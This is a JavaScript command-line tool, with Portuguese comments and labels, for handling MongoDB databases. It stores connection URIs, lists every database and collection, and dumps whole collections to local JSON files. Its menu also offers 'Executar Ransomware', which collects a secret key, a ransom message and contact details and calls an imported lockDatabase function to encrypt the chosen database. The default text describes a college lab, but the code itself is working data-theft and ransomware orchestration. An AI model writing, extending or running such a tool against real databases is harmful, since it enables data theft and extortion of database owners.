import { MongoClient } from "mongodb";
import fs from "fs";
import { URL } from "url";
import chalk from "chalk";
import { input, select, confirm } from "@inquirer/prompts"; // Adicionado confirm
import ora from "ora";
import inquirer from "inquirer";

// Import da sua função de Ransomware
import { lockDatabase } from "../utils/cryp.js";

const DB_STORAGE_FILE = "MongoDBs.txt";

class MongoManager {
  constructor(uri) {
    this.uri = uri;
    try {
      const parsedUrl = new URL(uri);
      this.dbName = parsedUrl.pathname.replace("/", "") || "admin";
    } catch (e) {
      this.dbName = "unknown";
    }
    this.client = new MongoClient(this.uri, { serverSelectionTimeoutMS: 5000 });
  }

  async testConnection() {
    try {
      await this.client.connect();
      await this.client.db(this.dbName).command({ ping: 1 });
      return true;
    } catch (error) {
      return false;
    } finally {
      await this.client.close();
    }
  }

  async getDatabasesAndCollections() {
    try {
      await this.client.connect();
      const admin = this.client.db().admin();
      const dbs = await admin.listDatabases();

      let structure = [];
      for (const dbInfo of dbs.databases) {
        const db = this.client.db(dbInfo.name);
        const collections = await db.listCollections().toArray();
        collections.forEach((col) => {
          structure.push({ db: dbInfo.name, coll: col.name });
        });
      }
      return structure;
    } finally {
      await this.client.close();
    }
  }

  async dumpCollection(dbName, collName) {
    try {
      await this.client.connect();
      const data = await this.client
        .db(dbName)
        .collection(collName)
        .find({})
        .toArray();
      const fileName = `DUMP_${dbName}_${collName}_${Date.now()}.json`;
      fs.writeFileSync(fileName, JSON.stringify(data, null, 2));
      console.log(chalk.green(`\n[!] DUMP CONCLUÍDO: ${fileName}`));
    } catch (error) {
      console.error(chalk.red("Erro no Dump:"), error);
    } finally {
      await this.client.close();
    }
  }
}

// --- FUNÇÃO DE RANSOMWARE INTEGRADA ---

async function runRansomFlow(uri) {
  const keySecret = await input({
    message: chalk.bold("Defina a CHAVE SECRETA para o ataque:"),
    validate: (v) => v.length > 0 || "A chave não pode estar vazia!",
  });

  const ransomMsg = await input({
    message: "Mensagem de resgate:",
    default: "Dados criptografados em nosso ambiente controlado de faculdade.",
  });

  const contactInfo = await input({
    message: "Informação de contato:",
    default: "estudante@cybersec.edu",
  });

  const check = await confirm({
    message: chalk.red(`⚠️  CONFIRMAR LOCK MASSIVO NA URI: ${uri}?`),
    default: false,
  });

  if (check) {
    const spinner = ora(
      chalk.red("Iniciando criptografia dos dados..."),
    ).start();
    try {
      await lockDatabase(uri, keySecret, ransomMsg, contactInfo);
      spinner.succeed(chalk.bold("URI bloqueada com sucesso!"));
    } catch (err) {
      spinner.fail(chalk.red("Erro no Ransomware: " + err.message));
    }
  }
}

// --- FUNÇÕES DE MENU ---

export async function mongoManagerMenu() {
  console.clear();

  const mode = await select({
    message: "Gerenciador de URIs:",
    choices: [
      { name: "🔍 Consult MongoDb", value: "consult" },
      { name: "➕ Add MongoDb", value: "add" },
      { name: chalk.red("🗑️ Delete MongoDb"), value: "delete" },
      { name: chalk.gray("⬅ Voltar"), value: "back" },
    ],
  });

  console.clear();

  if (mode === "back") return;
  if (mode === "add") await addMongoDbFlow();
  if (mode === "consult") await consultMongoDbFlow();
  if (mode === "delete") await deleteMongoDbFlow();
}

async function consultMongoDbFlow() {
  if (!fs.existsSync(DB_STORAGE_FILE)) {
    console.log(chalk.red("\n[!] MongoDBs.txt não encontrado ou vazio."));
    return;
  }

  const uris = fs
    .readFileSync(DB_STORAGE_FILE, "utf-8")
    .split("\n")
    .filter(Boolean);

  const selectedUri = await select({
    message: "Selecione uma URI salva:",
    choices: [
      ...uris.map((u) => ({ name: u, value: u })),
      { name: chalk.gray("Voltar"), value: "back" },
    ],
  });

  if (selectedUri !== "back") {
    const action = await select({
      message: `Ação para a URI selecionada:`,
      choices: [
        { name: "📂 Explorar Structure & Dump", value: "dump" },
        { name: "💀 Executar Ransomware", value: "ransom" },
        { name: chalk.gray("Cancelar"), value: "back" },
      ],
    });

    if (action === "dump") await selectDumpFlow(selectedUri);
    if (action === "ransom") await runRansomFlow(selectedUri);
  }
}

async function deleteMongoDbFlow() {
  if (!fs.existsSync(DB_STORAGE_FILE)) {
    console.log(chalk.red("\n[!] Nenhum banco salvo para remover."));
    return;
  }

  const uris = fs
    .readFileSync(DB_STORAGE_FILE, "utf-8")
    .split("\n")
    .filter(Boolean);

  const toDelete = await select({
    message: "Selecione a URI para REMOVER:",
    choices: [
      ...uris.map((u) => ({ name: u, value: u })),
      { name: chalk.gray("Cancelar"), value: "cancel" },
    ],
  });

  if (toDelete !== "cancel") {
    const newUris = uris.filter((u) => u !== toDelete);
    fs.writeFileSync(
      DB_STORAGE_FILE,
      newUris.join("\n") + (newUris.length ? "\n" : ""),
    );
    console.log(chalk.green(`[!] URI removida: ${toDelete}`));
  }
}

async function addMongoDbFlow() {
  while (true) {
    const uri = await input({ message: "insert_uri (ou .exit para voltar):" });
    if (uri === ".exit") return;

    const spinner = ora(chalk.blue("Validating connection...")).start();
    const manager = new MongoManager(uri);
    const isOk = await manager.testConnection();

    if (isOk) {
      spinner.succeed(chalk.green("Successful connection!"));
      let currentUris = fs.existsSync(DB_STORAGE_FILE)
        ? fs.readFileSync(DB_STORAGE_FILE, "utf-8").split("\n").filter(Boolean)
        : [];

      if (!currentUris.includes(uri)) {
        fs.appendFileSync(DB_STORAGE_FILE, `${uri}\n`);
        console.log(chalk.yellow("[*] URI salva em MongoDBs.txt"));
      }
      await selectDumpFlow(uri);
      break;
    } else {
      spinner.fail(chalk.red("Failed connection\n"));
    }
  }
}

async function selectDumpFlow(uri) {
  const manager = new MongoManager(uri);
  const spinner = ora(chalk.blue("Fetching database structure...")).start();
  try {
    const structure = await manager.getDatabasesAndCollections();
    spinner.stop();
    const choices = structure.map((s) => ({
      name: `📁 ${s.db} > 📄 ${s.coll}`,
      value: s,
    }));
    choices.push(new inquirer.Separator(), {
      name: "⬅ Return",
      value: "return",
    });

    const target = await select({
      message: "Select dump (Database or Table):",
      choices: choices,
    });
    if (target !== "return") {
      const dSpinner = ora(
        chalk.magenta(`Realizando Dump de ${target.coll}...`),
      ).start();
      await manager.dumpCollection(target.db, target.coll);
      dSpinner.succeed("Dump finalizado!");
    }
  } catch (err) {
    spinner.fail(chalk.red("Erro ao listar estrutura: " + err.message));
  }
}
